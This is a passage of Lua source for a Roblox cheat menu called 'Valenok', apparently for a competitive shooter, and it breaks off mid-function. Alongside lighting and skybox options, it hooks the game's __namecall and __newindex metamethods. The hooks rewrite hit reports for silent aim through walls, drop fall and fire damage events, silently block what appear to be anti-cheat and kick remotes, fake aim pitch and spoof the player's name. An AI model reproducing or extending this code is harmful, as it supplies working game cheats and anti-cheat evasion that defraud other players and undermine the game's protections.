VisualSections.ThirdPerson:AddToggle('ThirdPersonHideVM', {Text = 'Hide viewmodel', Default = true})
VisualSections.ThirdPerson:AddToggle('ThirdPersonNoClip', {Text = 'Camera through walls', Default = false, Callback = function() Shared.updateThirdPersonNoClip() end})

WorldSections.Ambience:AddToggle('AmbienceCustomTime', {Text = 'Custom time', Default = false}):OnChanged(function() Shared.MiscState.ambienceDirty = true end)
WorldSections.Ambience:AddSlider('AmbienceTime', {Text = 'Time', Default = 12, Min = 0, Max = 24, Rounding = 1}):OnChanged(function() Shared.MiscState.ambienceDirty = true end)
WorldSections.Ambience:AddToggle('AmbienceCustomSkybox', {Text = 'Custom skybox', Default = false, ColorPicker = {Idx = 'AmbienceSkyboxColor', Default = Color3.fromRGB(0, 0, 0), Title = 'Skybox color', Callback = function() Shared.MiscState.ambienceDirty = true end}}):OnChanged(function() Shared.MiscState.ambienceDirty = true end)
WorldSections.Ambience:AddToggle('AmbienceSkyColor', {Text = 'Sky color', Default = false, ColorPicker = {Idx = 'AmbienceSkyColorValue', Default = Color3.fromRGB(0, 0, 0), Title = 'Sky color', Callback = function() Shared.MiscState.ambienceDirty = true end}}):OnChanged(function() Shared.MiscState.ambienceDirty = true end)
WorldSections.Ambience:AddToggle('AmbienceNoShadow', {Text = 'No shadow', Default = false}):OnChanged(function() Shared.MiscState.ambienceDirty = true end)

WorldSections.Ambience:AddToggle('AmbienceSkyboxChanger', {Text = 'Skybox changer', Default = false, Callback = function() applySkyboxChanger() end})
WorldSections.Ambience:AddDropdown('AmbienceSkyboxPreset', {
    Text = 'Skybox preset',
    Values = {"Game's Sky", "Purple Nebula", "Night Sky", "Pink Daylight", "Morning Glow", "Setting Sun", "Fade Blue", "Elegant Morning", "Neptune", "Redshift", "Aesthetic Night", "Gloomy Gray", "Light Within Dark", "Green Space", "The Winter", "Oblivion", "Final Bloodmoon", "Clouds", "Twilight", "Red Mountain", "Cloudy Skies", "Dark Blue"},
    Default = "Game's Sky",
    Callback = function() applySkyboxChanger() end,
})
WorldSections.Ambience:AddInput('AmbienceSkyboxAssetId', {Text = 'Custom asset ID', Default = '', Placeholder = 'e.g. 159454299', Callback = function() applySkyboxChanger() end})

WorldSections.Lighting:AddToggle('LightingBetterShadows', {Text = 'Better shadows', Default = false})
WorldSections.Lighting:AddToggle('LightingAmbient', {Text = 'Enabled ambient', Default = false, ColorPicker = {Idx = 'LightingAmbientColor', Default = Color3.fromRGB(128, 128, 128), Title = 'Ambient color'}})
WorldSections.Lighting:AddSlider('LightingBrightness', {Text = 'Brightness', Default = 2, Min = 0, Max = 10, Rounding = 1})
WorldSections.Lighting:AddToggle('LightingGradient', {Text = 'Gradient', Default = false, ColorPicker = {Idx = 'LightingGradientColor', Default = Color3.fromRGB(90, 90, 90), Title = 'Gradient color 1'}})
WorldSections.Lighting:AddToggle('LightingGradient2', {Text = 'Gradient color 2', Default = false, ColorPicker = {Idx = 'LightingGradientColor2', Default = Color3.fromRGB(150, 150, 150), Title = 'Gradient color 2'}})
WorldSections.Lighting:AddToggle('LightingSaturation', {Text = 'Saturation', Default = false})
WorldSections.Lighting:AddSlider('LightingSaturationValue', {Text = 'Saturation value', Default = 10, Min = 0, Max = 100, Rounding = 0})

MiscSections.NameSpoofer:AddToggle('MiscSpoofName', {Text = 'Enabled', Default = false})
MiscSections.NameSpoofer:AddInput('MiscSpoofedName', {Text = 'Spoofed name', Default = '', Placeholder = 'Enter name...'})

MiscSections.General:AddToggle('MiscRemoveRadio', {Text = 'Remove radio commands', Default = false})
MiscSections.General:AddToggle('MiscRemoveUI', {Text = 'Remove UI elements', Default = false, Callback = function() Shared.applyRemoveUIElements() end})
MiscSections.General:AddToggle('MiscSlideWalk', {Text = 'Slide walk', Default = false})

VisualSections.FOVChanger:AddToggle('VisualFovChanger', {Text = 'FOV changer', Default = false, Callback = function() Shared.applyFovChanger() end})
VisualSections.FOVChanger:AddSlider('VisualFovValue', {Text = 'FOV value', Default = 80, Min = 50, Max = 120, Rounding = 0, Callback = function() Shared.applyFovChanger() end})

ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ 'MenuKeybind', 'SkinKnifeSkin', 'SkinWeaponSkin', 'SkinGloveSkin', 'SkinInvKnifeSkin', 'SkinInvWeaponSkin', 'SkinInvGloveSkin' })
ThemeManager:SetFolder('Valenok')
SaveManager:SetFolder('Valenok')

local MENU_FONT_MAP = {
    Code = Enum.Font.Code,
    Ubuntu = Enum.Font.Ubuntu,
    Gotham = Enum.Font.Gotham,
    GothamMedium = Enum.Font.GothamMedium,
    GothamBold = Enum.Font.GothamBold,
    SourceSans = Enum.Font.SourceSans,
    SourceSansBold = Enum.Font.SourceSansBold,
    Roboto = Enum.Font.Roboto,
    RobotoMono = Enum.Font.RobotoMono,
    Arcade = Enum.Font.Arcade,
    Legacy = Enum.Font.Legacy,
}

local MenuFontPreviewLabels = {}

local function styleMenuFontPreviewLabel(inst)
    if not inst or not inst.Parent then return end
    if not (inst:IsA("TextLabel") or inst:IsA("TextButton")) then return end
    local mapped = MENU_FONT_MAP[inst.Text]
    if not mapped then return end
    pcall(function()
        inst.Font = mapped
    end)
    MenuFontPreviewLabels[inst] = mapped
end

local function refreshMenuFontPreviews()
    for inst in pairs(MenuFontPreviewLabels) do
        if not inst or not inst.Parent then
            MenuFontPreviewLabels[inst] = nil
        end
    end

    if Library and Library.ScreenGui then
        for _, inst in ipairs(Library.ScreenGui:GetDescendants()) do
            styleMenuFontPreviewLabel(inst)
        end
    end

    for inst, mapped in pairs(MenuFontPreviewLabels) do
        if inst and inst.Parent then
            pcall(function()
                inst.Font = mapped
            end)
        end
    end
end

local function applyMenuFont(fontName)
    if not Library then return end
    local font = MENU_FONT_MAP[fontName] or Enum.Font.Code
    Library.Font = font

    local function applyTo(inst)
        if not inst then return end
        if MenuFontPreviewLabels[inst] then return end
        if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then

            if MENU_FONT_MAP[inst.Text] then
                styleMenuFontPreviewLabel(inst)
                return
            end
            pcall(function() inst.Font = font end)
        end
    end

    if Library.ScreenGui then
        for _, inst in ipairs(Library.ScreenGui:GetDescendants()) do
            applyTo(inst)
        end
    end

    if type(Library.Registry) == "table" then
        for _, data in pairs(Library.Registry) do
            if type(data) == "table" then
                applyTo(data.Instance)
            end
        end
    end

    if type(Library.HudRegistry) == "table" then
        for _, data in pairs(Library.HudRegistry) do
            if type(data) == "table" then
                applyTo(data.Instance)
            end
        end
    end

    refreshMenuFontPreviews()
end

do
    local ConfigSection = Tabs.Config:AddLeftGroupbox('Menu')
    
    ConfigSection:AddButton({
        Text = 'Unload',
        Func = function()
            if unloadValenok then unloadValenok() end
        end,
    })
    
    ConfigSection:AddToggle('ShowCursorToggle', {
        Text = 'Custom Cursor',
        Default = true,
        Tooltip = 'Toggles the custom mouse cursor for the UI',
        Callback = function(Value)
            if Library then
                Library.ShowCustomCursor = Value
            end
        end
    })
    
    ConfigSection:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu' })
    
    ConfigSection:AddSlider('MenuUpdateRate', {
        Text = 'Update rate',
        Default = 200,
        Min = 1,
        Max = 500,
        Rounding = 0,
        Suffix = '/s',
    })
    
    ConfigSection:AddDropdown('MenuFont', {
        Text = 'Menu font',
        Values = {
            'Code', 'Ubuntu', 'Gotham', 'GothamMedium', 'GothamBold',
            'SourceSans', 'SourceSansBold', 'Roboto', 'RobotoMono', 'Arcade', 'Legacy',
        },
        Default = 'Code',
        Callback = function(value)
            if applyMenuFont then applyMenuFont(value) end
        end,
    })

    if Options and Options.MenuFont then
        local menuFontOpt = Options.MenuFont
        
        if type(menuFontOpt.SetValues) == "function" then
            local origSetValues = menuFontOpt.SetValues
            menuFontOpt.SetValues = function(self, ...)
                local result = origSetValues(self, ...)
                if refreshMenuFontPreviews then task.defer(refreshMenuFontPreviews) end
                return result
            end
        end
        
        if type(menuFontOpt.OpenDropdown) == "function" then
            local origOpen = menuFontOpt.OpenDropdown
            menuFontOpt.OpenDropdown = function(self, ...)
                local result = origOpen(self, ...)
                if refreshMenuFontPreviews then task.defer(refreshMenuFontPreviews) end
                return result
            end
        end
        
        if type(menuFontOpt.Display) == "function" then
            local origDisplay = menuFontOpt.Display
            menuFontOpt.Display = function(self, ...)
                local result = origDisplay(self, ...)
                if refreshMenuFontPreviews then task.defer(refreshMenuFontPreviews) end
                return result
            end
        end
    end

    if Library and Library.ScreenGui then
        Library:GiveSignal(Library.ScreenGui.DescendantAdded:Connect(function(inst)
            task.defer(function()
                if styleMenuFontPreviewLabel then styleMenuFontPreviewLabel(inst) end
            end)
        end))
    end
end

Library.ToggleKeybind = Options.MenuKeybind
Library.KeybindFrame.Visible = true
applyMenuFont(Options.MenuFont and Options.MenuFont.Value or 'Code')
task.defer(refreshMenuFontPreviews)

do
    local MenuInputLock = {
        active = false,
        modal = nil,
        savedMouseBehavior = nil,
        savedIconEnabled = nil,
    }

    local function ensureMenuModal()
        if MenuInputLock.modal and MenuInputLock.modal.Parent then
            return MenuInputLock.modal
        end
        local parent = Library.ScreenGui
        if not parent then return nil end

        local modal = Instance.new("TextButton")
        modal.Name = "ValenokMenuModal"
        modal.BackgroundTransparency = 1
        modal.BorderSizePixel = 0
        modal.Text = ""
        modal.AutoButtonColor = false
        modal.Size = UDim2.fromScale(1, 1)
        modal.Position = UDim2.fromScale(0, 0)
        modal.ZIndex = 0
        modal.Modal = false
        modal.Active = true
        modal.Selectable = false
        modal.Visible = false
        modal.Parent = parent
        MenuInputLock.modal = modal
        return modal
    end

    local function setMenuInputLock(open)
        open = open == true
        if MenuInputLock.active == open then

            if open then
                pcall(function()
                    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
                    UserInputService.MouseIconEnabled = true
                end)
            end
            return
        end
        MenuInputLock.active = open

        local modal = ensureMenuModal()
        if modal then
            modal.Visible = open
            modal.Modal = open

            modal.ZIndex = 0
        end

        if open then
            MenuInputLock.savedMouseBehavior = UserInputService.MouseBehavior
            MenuInputLock.savedIconEnabled = UserInputService.MouseIconEnabled
            pcall(function()
                UserInputService.MouseBehavior = Enum.MouseBehavior.Default
                UserInputService.MouseIconEnabled = true
            end)
        else
            pcall(function()
                if MenuInputLock.savedMouseBehavior ~= nil then
                    UserInputService.MouseBehavior = MenuInputLock.savedMouseBehavior
                end
                if MenuInputLock.savedIconEnabled ~= nil then
                    UserInputService.MouseIconEnabled = MenuInputLock.savedIconEnabled
                end
            end)
            MenuInputLock.savedMouseBehavior = nil
            MenuInputLock.savedIconEnabled = nil
        end
    end

    local function isMenuOpen()
        return Library and Library.IsMenuVisible and Library:IsMenuVisible()
    end

    if type(Library.Toggle) == "function" then
        local origToggle = Library.Toggle
        Library.Toggle = function(...)
            local results = table.pack(origToggle(...))
            task.defer(function()
                setMenuInputLock(isMenuOpen())
            end)
            return table.unpack(results, 1, results.n)
        end
    end

    EspRuntime.Connections.MenuInputLock = RunService.RenderStepped:Connect(function()
        local open = isMenuOpen()
        setMenuInputLock(open)
        if open then

            pcall(function()
                if UserInputService.MouseBehavior ~= Enum.MouseBehavior.Default then
                    UserInputService.MouseBehavior = Enum.MouseBehavior.Default
                end
                if not UserInputService.MouseIconEnabled then
                    UserInputService.MouseIconEnabled = true
                end
            end)
        end
    end)

    EspRuntime.Connections.MenuInputSink = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if not isMenuOpen() then return end
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.MouseButton2
            or input.UserInputType == Enum.UserInputType.MouseButton3 then

            return
        end
    end)

    setMenuInputLock(isMenuOpen())
end

SaveManager:BuildConfigSection(Tabs.Config)
ThemeManager:ApplyToTab(Tabs.Config)
SaveManager:LoadAutoloadConfig()
if HitpartSilent.refreshMethod then HitpartSilent.refreshMethod() end
end)()

;(function()
local CrosshairHideState = { lastHideState = nil, conns = {}, originals = {} }

local function saveOriginal(child)
    if CrosshairHideState.originals[child] then return end

    local state = {}
    if child:IsA("Frame") then
        state.BackgroundTransparency = child.BackgroundTransparency
    elseif child:IsA("ImageLabel") or child:IsA("ImageButton") then
        state.ImageTransparency = child.ImageTransparency
    elseif child:IsA("TextLabel") or child:IsA("TextButton") then
        state.TextTransparency = child.TextTransparency
        state.TextStrokeTransparency = child.TextStrokeTransparency
    elseif child:IsA("UIStroke") then
        state.Transparency = child.Transparency
        state.Enabled = child.Enabled
    else
        return
    end

    CrosshairHideState.originals[child] = state
end

local function applyCrosshairHide(child)
    if not child or not child.Parent then return end
    saveOriginal(child)

    if child:IsA("Frame") then
        child.BackgroundTransparency = 1
    elseif child:IsA("ImageLabel") or child:IsA("ImageButton") then
        child.ImageTransparency = 1
    elseif child:IsA("TextLabel") or child:IsA("TextButton") then
        child.TextTransparency = 1
        child.TextStrokeTransparency = 1
    elseif child:IsA("UIStroke") then
        child.Transparency = 1
        child.Enabled = false
    end
end

local function restoreCrosshairHide()
    for child, state in pairs(CrosshairHideState.originals) do
        if child and child.Parent then
            pcall(function()
                if child:IsA("Frame") then
                    child.BackgroundTransparency = state.BackgroundTransparency
                elseif child:IsA("ImageLabel") or child:IsA("ImageButton") then
                    child.ImageTransparency = state.ImageTransparency
                elseif child:IsA("TextLabel") or child:IsA("TextButton") then
                    child.TextTransparency = state.TextTransparency
                    child.TextStrokeTransparency = state.TextStrokeTransparency
                elseif child:IsA("UIStroke") then
                    child.Transparency = state.Transparency
                    child.Enabled = state.Enabled
                end
            end)
        end
    end
    table.clear(CrosshairHideState.originals)
end

local function disconnectCrosshairHide()
    for _, conn in ipairs(CrosshairHideState.conns) do
        if conn then conn:Disconnect() end
    end
    CrosshairHideState.conns = {}
end

local function setupCrosshairHide()
    local hideEnabled = (Toggles.MiscHideCrosshair and Toggles.MiscHideCrosshair.Value)
        or (Toggles.MiscCenterDot and Toggles.MiscCenterDot.Value)

    if hideEnabled == CrosshairHideState.lastHideState then return end
    CrosshairHideState.lastHideState = hideEnabled
    disconnectCrosshairHide()

    if hideEnabled then
        local gui = getGuiFrame()
        if gui then
            local ch = gui:FindFirstChild("Crosshairs")
            if ch then
                for _, child in ipairs(ch:GetDescendants()) do
                    applyCrosshairHide(child)
                end
                table.insert(CrosshairHideState.conns, ch.DescendantAdded:Connect(function(child)
                    applyCrosshairHide(child)
                end))
            end
        end
    else
        restoreCrosshairHide()
    end
end

getgenv().ValenokRestoreCrosshair = function()
    disconnectCrosshairHide()
    restoreCrosshairHide()
    CrosshairHideState.lastHideState = nil
end

Toggles.MiscHideCrosshair:OnChanged(setupCrosshairHide)
Toggles.MiscCenterDot:OnChanged(setupCrosshairHide)
task.spawn(setupCrosshairHide)
end)()

Shared.AmbienceState = {
    OrigAmbient = nil,
    OrigOutdoorAmbient = nil,
    OrigTechnology = nil,
    OrigLightingBrightness = nil,
    SaturationCC = nil,
}
;(function()
local Lighting = game:GetService("Lighting")

pcall(function()
    local folder = workspace:FindFirstChild("ValenokGrenadeAreas")
    if folder then folder:Destroy() end
    local rayIgnore = workspace:FindFirstChild("Ray_Ignore")
    local fires = rayIgnore and rayIgnore:FindFirstChild("Fires")
    if fires then
        for _, desc in ipairs(fires:GetDescendants()) do
            if desc.Name == "ValenokGrenadeArea" then
                pcall(function() desc:Destroy() end)
            end
        end
    end
end)

Shared.AmbienceState.LoopRunning = true
task.spawn(function()
    local lastBetterShadows = nil
    while Shared.AmbienceState.LoopRunning do
            task.wait(0.2)
            if not Shared.AmbienceState.LoopRunning then break end

            local betterShadows = Toggles.LightingBetterShadows and Toggles.LightingBetterShadows.Value
            if betterShadows ~= lastBetterShadows then
                lastBetterShadows = betterShadows
                if betterShadows then
                    if Shared.AmbienceState.OrigTechnology == nil then
                        pcall(function() Shared.AmbienceState.OrigTechnology = gethiddenproperty(Lighting, "Technology") end)
                    end
                    pcall(function() sethiddenproperty(Lighting, "Technology", Enum.Technology.ShadowMap) end)
                else
                    if Shared.AmbienceState.OrigTechnology ~= nil then
                        pcall(function() sethiddenproperty(Lighting, "Technology", Shared.AmbienceState.OrigTechnology) end)
                        Shared.AmbienceState.OrigTechnology = nil
                    end
                end
            end

            if Toggles.LightingAmbient and Toggles.LightingAmbient.Value then
                if Shared.AmbienceState.OrigAmbient == nil then Shared.AmbienceState.OrigAmbient = Lighting.Ambient end
                Lighting.Ambient = getOptionColor("LightingAmbientColor", Color3.fromRGB(128, 128, 128))
            else
                if Shared.AmbienceState.OrigAmbient ~= nil then
                    Lighting.Ambient = Shared.AmbienceState.OrigAmbient
                    Shared.AmbienceState.OrigAmbient = nil
                end
            end

            local anyLightingOn = (Toggles.LightingBetterShadows and Toggles.LightingBetterShadows.Value)
                or (Toggles.LightingAmbient and Toggles.LightingAmbient.Value)
                or (Toggles.LightingGradient and Toggles.LightingGradient.Value)
                or (Toggles.LightingSaturation and Toggles.LightingSaturation.Value)
            if anyLightingOn then
                local lbright = Options.LightingBrightness and Options.LightingBrightness.Value or 2
                if Shared.AmbienceState.OrigLightingBrightness == nil then Shared.AmbienceState.OrigLightingBrightness = Lighting.Brightness end
                Lighting.Brightness = lbright
            else
                if Shared.AmbienceState.OrigLightingBrightness ~= nil then
                    Lighting.Brightness = Shared.AmbienceState.OrigLightingBrightness
                    Shared.AmbienceState.OrigLightingBrightness = nil
                end
            end

            if Toggles.LightingGradient and Toggles.LightingGradient.Value then
                if Shared.AmbienceState.OrigAmbient == nil then Shared.AmbienceState.OrigAmbient = Lighting.Ambient end
                if Shared.AmbienceState.OrigOutdoorAmbient == nil then Shared.AmbienceState.OrigOutdoorAmbient = Lighting.OutdoorAmbient end
                Lighting.Ambient = getOptionColor("LightingGradientColor", Color3.fromRGB(90, 90, 90))
                Lighting.OutdoorAmbient = getOptionColor("LightingGradientColor2", Color3.fromRGB(150, 150, 150))
            else
                if Shared.AmbienceState.OrigOutdoorAmbient ~= nil then
                    Lighting.OutdoorAmbient = Shared.AmbienceState.OrigOutdoorAmbient
                    Shared.AmbienceState.OrigOutdoorAmbient = nil
                end
            end

            if Toggles.LightingSaturation and Toggles.LightingSaturation.Value then
                if not Shared.AmbienceState.SaturationCC or not Shared.AmbienceState.SaturationCC.Parent then
                    local existing = Lighting:FindFirstChild("ValenokSaturationCC")
                    if existing then
                        Shared.AmbienceState.SaturationCC = existing
                    else
                        Shared.AmbienceState.SaturationCC = Instance.new("ColorCorrectionEffect")
                        Shared.AmbienceState.SaturationCC.Name = "ValenokSaturationCC"
                        Shared.AmbienceState.SaturationCC.Parent = Lighting
                    end
                end
                local satVal = Options.LightingSaturationValue and Options.LightingSaturationValue.Value or 10
                Shared.AmbienceState.SaturationCC.Saturation = satVal / 50
            else
                if Shared.AmbienceState.SaturationCC then
                    Shared.AmbienceState.SaturationCC:Destroy()
                    Shared.AmbienceState.SaturationCC = nil
                end
            end
    end
end)
end)()

local restoreNamecallHook
local restoreNewindexHook
_oldNamecall = nil
_oldNewindex = nil
_newindexInstalled = false

;(function()
local function getSilentTargetPos(targetPart)
    local aimPoint = getgenv().PSilentAimPoint
    if typeof(aimPoint) == "Vector3" then return aimPoint end
    if not targetPart then return nil end
    if targetPart.CFrame then return targetPart.CFrame.Position end
    return targetPart.Position
end

local function applySilentHitParl(args)
    local tgt = getgenv().PSilentTarget
    if not tgt or not tgt.Parent then return args end
    if not RuntimePack.silentActive then return args end
    if not RuntimePack.canCombatFire() then return args end
    local tgtChar = tgt:FindFirstAncestorOfClass("Model") or tgt.Parent
    if hasShield(tgtChar) then return args end
    local hitPos = getSilentTargetPos(tgt)
    local walls, canHit
    if tgt == CombatScan.ragePart and hitPos == CombatScan.ragePoint then
        walls = CombatScan.rageWalls
        canHit = walls <= CombatScan.maxWalls
    else
        walls, canHit = CombatScan.wallInfo(tgt, hitPos)
    end
    if not canHit then return args end
    local fireGun = args[5]
    if typeof(fireGun) == "Instance" and fireGun:FindFirstChild("Melee") then
        local meleeRange = 64
        local weapons = getWeaponsFolder()
        local weaponDef = weapons and type(args[3]) == "string" and weapons:FindFirstChild(args[3])
        local rangeObj = weaponDef and weaponDef:FindFirstChild("Range")
        if rangeObj and type(rangeObj.Value) == "number" then
            meleeRange = math.clamp(rangeObj.Value, 1, 64)
        end
        local cam = getCamera()
        if cam and typeof(hitPos) == "Vector3"
            and (hitPos - cam.CFrame.Position).Magnitude > meleeRange then
            return args
        end
        args[4] = meleeRange
    end
    args[1] = tgt
    args[2] = { X = 0/0, Y = 0/0, Z = 0/0 }
    if type(args[4]) ~= "number" or args[4] <= 0 then
        args[4] = 4096
    end
    args[9] = walls > 0
    local camPos = typeof(args[10]) == "Vector3" and args[10] or nil
    if not camPos then
        local cam = getCamera()
        camPos = cam and cam.CFrame.Position
        if camPos then args[10] = camPos end
    end
    if camPos and typeof(hitPos) == "Vector3" then
        local dir = hitPos - camPos
        if dir.Magnitude > 0.001 then
            args[12] = dir.Unit
        end
    end
    return args
end

restoreNamecallHook = function()
    getgenv()._ValenokHooksActive = false
    pcall(function()
        local trueOld = getgenv()._ValenokTrueNamecall
        if trueOld and not getgenv()._ValenokNamecallRestored then
            hookmetamethod(game, "__namecall", trueOld)
            getgenv()._ValenokNamecallRestored = true
            _oldNamecall = nil
        elseif _oldNamecall then
            hookmetamethod(game, "__namecall", _oldNamecall)
            _oldNamecall = nil
        end
    end)
end

pcall(function()
    local string_find = string.find
    local table_pack = table.pack

    _oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
        if not getgenv()._ValenokHooksActive then
            return _oldNamecall(self, ...)
        end
        local method = getnamecallmethod()

        if method == "SetPrimaryPartCFrame" or method == "PivotTo" or method == "pivotTo" then
            if Toggles.VMOffsetEnable and Toggles.VMOffsetEnable.Value and self.Name ~= "HumanoidRootPart" then
                local isArms = false
                local p = self
                while p do
                    if p.Name == "Arms" then isArms = true; break end
                    p = p.Parent
                end
                if isArms then
                    local cf = ...
                    if typeof(cf) == "CFrame" then
                        local offX = (Options.VMOffsetX and Options.VMOffsetX.Value or 0) / 10
                        local offY = (Options.VMOffsetY and Options.VMOffsetY.Value or 0) / 10
                        local offZ = (Options.VMOffsetZ and Options.VMOffsetZ.Value or 0) / 10
                        local roll = math.rad(Options.VMRoll and Options.VMRoll.Value or 0)
                        cf = cf * CFrame.new(offX, offY, -offZ) * CFrame.Angles(0, 0, roll)
                        return _oldNamecall(self, cf, select(2, ...))
                    end
                end
            end
            return _oldNamecall(self, ...)
        end

        if method == "FireServer" or method == "FireUnreliable" then
            local name = self.Name
            if name == "FallDamage" and Toggles.ExploitNoFallDamage and Toggles.ExploitNoFallDamage.Value then
                return
            end
            if name == "ohnoflames" and Toggles.ExploitNoFireDamage and Toggles.ExploitNoFireDamage.Value then
                return
            end

            if name == "Boogers" or name == "HaIIoooooooooooo" or name == "Rem3" or name == "ewrtsjkwrslk" then
                return
            end
            if name == "ParticleRemote" then
                local a1 = ...
                if type(a1) == "table" and a1[1] == "kick" then
                    return
                end
            end

            if name == "ControlTurn" then

                if Toggles.AntiAimPitchEnable and Toggles.AntiAimPitchEnable.Value then
                    local pitchMode = Options.AntiAimPitchMode and Options.AntiAimPitchMode.Value or "None"
                    if pitchMode ~= "None" then
                        local hookArgs = {...}
                        if pitchMode == "Down" then
                            hookArgs[1] = -1
                        elseif pitchMode == "Up" then
                            hookArgs[1] = 1
                        elseif pitchMode == "Custom" then
                            hookArgs[1] = Options.AntiAimPitchCustom and Options.AntiAimPitchCustom.Value or 0
                        elseif pitchMode == "Random" then
                            hookArgs[1] = AntiAimState.PitchRandomAngle
                        end
                        return _oldNamecall(self, unpack(hookArgs))
                    end
                end
                return _oldNamecall(self, ...)
            end
            if name == "HitParl" then
                local args = table_pack(...)

                if RuntimePack.silentActive and not HitpartSilent.injecting then
                    args = applySilentHitParl(args)
                end

                local hitPart = args[1]

                if RageHitLog.enabled() then
                    task.spawn(function()
                        pcall(RageHitLog.logHitParl, hitPart)
                    end)
                end

                if not hitPart or not hitPart.Parent then
                    return _oldNamecall(self, unpack(args, 1, args.n))
                end

                if (Toggles.MiscHitSound and Toggles.MiscHitSound.Value)
                    or (Toggles.MiscHitMarker and Toggles.MiscHitMarker.Value) then
                    task.spawn(function()
                        pcall(function()
                            if Toggles.MiscHitSound and Toggles.MiscHitSound.Value then PlayHitSound() end
                        end)
                        pcall(function()
                            if Toggles.MiscHitMarker and Toggles.MiscHitMarker.Value then ShowHitMarker() end
                        end)
                    end)
                end
                return _oldNamecall(self, unpack(args, 1, args.n))
            end

            if name == "Trail" then
                if Toggles.MiscBulletTracer and Toggles.MiscBulletTracer.Value then
                    local args = table_pack(...)
                    task.spawn(function()
                        pcall(function()
                            local a1, a2 = args[1], args[2]
                            local startPos = nil
                            if typeof(a1) == "CFrame" then
                                startPos = a1.Position
                            elseif typeof(a1) == "Vector3" then
                                startPos = a1
                            elseif typeof(a1) == "Instance" and a1:IsA("BasePart") then
                                startPos = a1.Position
                            end
                            local endPos = nil
                            if typeof(a2) == "Vector3" then
                                endPos = a2
                            elseif typeof(a2) == "CFrame" then
                                endPos = a2.Position
                            elseif typeof(a2) == "Instance" and a2:IsA("BasePart") then
                                endPos = a2.Position
                            end
                            if startPos and endPos then
                                if RuntimePack.silentActive then
                                    local silentTarget = getgenv().PSilentTarget
                                    if silentTarget and silentTarget.Parent then
                                        local tp = getSilentTargetPos(silentTarget)
                                        if typeof(tp) == "Vector3" then
                                            endPos = tp
                                        end
                                    end
                                end
                                drawBulletTracer(startPos, endPos)
                            end
                        end)
                    end)
                end
                return _oldNamecall(self, ...)
            end

            if name == "ReplicateShot" then
                pcall(function()
                    if Toggles.PeekAssistEnable and Toggles.PeekAssistEnable.Value then
                        peekAssistOnShot()
                    end
                end)
                local autoFireOn = Toggles.RagebotAutoFire and Toggles.RagebotAutoFire.Value
                if not autoFireOn and not HitpartSilent.injecting and RuntimePack.silentActive and RuntimePack.canCombatFire() then
                    local silentTarget = getgenv().PSilentTarget
                    if silentTarget and silentTarget.Parent then
                        local targetChar = silentTarget:FindFirstAncestorOfClass("Model") or silentTarget.Parent
                        if not hasShield(targetChar) then
                            HitpartSilent.fire(silentTarget, getgenv().PSilentAimPoint)
                        end
                    end
                end
                return _oldNamecall(self, ...)
            end

            return _oldNamecall(self, ...)
        end

        if method == "LoadAnimation" then
            if Toggles.MiscSlideWalk and Toggles.MiscSlideWalk.Value then
                local animArg = ...
                if typeof(animArg) == "Instance" and (animArg.Name == "RunAnim" or animArg.Name == "JumpAnim") then
                    return
                end
            end
            return _oldNamecall(self, ...)
        end

        return _oldNamecall(self, ...)
    end)
end)
if not getgenv()._ValenokTrueNamecall then
    getgenv()._ValenokTrueNamecall = _oldNamecall
end
getgenv()._ValenokNamecallRestored = false
getgenv()._ValenokHooksActive = true
end)()

restoreNewindexHook = function()
    getgenv()._ValenokHooksActive = false
    pcall(function()
        local trueOld = getgenv()._ValenokTrueNewindex
        if trueOld and not getgenv()._ValenokNewindexRestored then
            hookmetamethod(game, "__newindex", trueOld)
            getgenv()._ValenokNewindexRestored = true
            _oldNewindex = nil
        elseif _oldNewindex then
            hookmetamethod(game, "__newindex", _oldNewindex)
            _oldNewindex = nil
        end
    end)
end

local function installSpoofNewindex()
    if _newindexInstalled then return end
    _newindexInstalled = true
    pcall(function()
        _oldNewindex = hookmetamethod(game, "__newindex", function(obj, prop, value)
        if not getgenv()._ValenokHooksActive then
            return _oldNewindex(obj, prop, value)
        end
        if prop ~= "Text" and prop ~= "text" then
            return _oldNewindex(obj, prop, value)
        end
        if not (Toggles.MiscSpoofName and Toggles.MiscSpoofName.Value) then
            return _oldNewindex(obj, prop, value)
        end
        if type(value) ~= "string" or checkcaller() then
            return _oldNewindex(obj, prop, value)
        end
        local spoofName = Options.MiscSpoofedName and Options.MiscSpoofedName.Value
        if not spoofName or spoofName == "" then
            return _oldNewindex(obj, prop, value)
        end
        if not (obj:IsA("TextLabel") or obj:IsA("TextBox")) then
            return _oldNewindex(obj, prop, value)
        end
        local playerName = LocalPlayer.Name
        if playerName and playerName ~= "" and string.find(value, playerName, 1, true) then
            value = string.gsub(value, playerName, spoofName, 1)
        end
        local displayName = LocalPlayer.DisplayName
        if displayName and displayName ~= "" and displayName ~= playerName and string.find(value, displayName, 1, true) then
            value = string.gsub(value, displayName, spoofName, 1)
        end
        return _oldNewindex(obj, prop, value)
        end)
        if not getgenv()._ValenokTrueNewindex then
            getgenv()._ValenokTrueNewindex = _oldNewindex
        end
        getgenv()._ValenokNewindexRestored = false
        getgenv()._ValenokHooksActive = true
    end)
end

if Toggles.MiscSpoofName then
    Toggles.MiscSpoofName:OnChanged(function(v)
        if v then installSpoofNewindex() end
    end)
    if Toggles.MiscSpoofName.Value then installSpoofNewindex() end
end

;(function()
    local function fireHitFeedback()
        pcall(function()
            if Toggles.MiscHitSound and Toggles.MiscHitSound.Value then PlayHitSound() end
        end)
        pcall(function()
            if Toggles.MiscHitMarker and Toggles.MiscHitMarker.Value then ShowHitMarker() end
        end)
    end

    local function bindTotalDamage()
        local additionals = LocalPlayer:FindFirstChild("Additionals")
        if not additionals then return false end
        local totalDamage = additionals:FindFirstChild("TotalDamage")
        if not totalDamage then return false end
        if EspRuntime.Connections.TotalDamageChanged then
            pcall(function() EspRuntime.Connections.TotalDamageChanged:Disconnect() end)
        end
        if EspRuntime.Connections.TotalDamageAdded then
            pcall(function() EspRuntime.Connections.TotalDamageAdded:Disconnect() end)
            EspRuntime.Connections.TotalDamageAdded = nil
        end
        local oldDamage = totalDamage.Value
        EspRuntime.Connections.TotalDamageChanged = totalDamage.Changed:Connect(function(newVal)
